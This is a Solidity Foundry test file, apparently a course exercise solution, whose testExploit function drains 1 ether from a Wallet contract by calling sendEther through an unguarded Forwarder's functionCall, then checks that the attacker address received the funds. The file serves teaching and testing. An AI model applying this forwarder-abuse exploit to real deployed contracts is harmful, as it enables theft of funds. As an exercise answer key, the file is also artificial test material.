// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test, console2} from "forge-std/Test.sol";
import {Wallet, Forwarder} from "../../src/Week10-11/Forwarder.sol";

//forge test --match-contract ForwarderTest -vvvv
contract ForwarderTest is Test {
    address attackerWallet;
    uint256 attackerWalletBalanceBefore;
    Forwarder forwarderContract;
    Wallet walletContract;

    function setUp() public {
        attackerWallet = address(0xdead);
        forwarderContract = new Forwarder();
        walletContract = (new Wallet){value: 1 ether}(address(forwarderContract));
        attackerWalletBalanceBefore = attackerWallet.balance;
    }

    function testExploit() public {
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
        forwarderContract.functionCall(address(walletContract), data);

        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqAbs(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            1000000000000000 //delta = 0.001
        );
        uint256 walletContractBalance = address(walletContract).balance;
        assertEq(walletContractBalance, 0);
    }
}
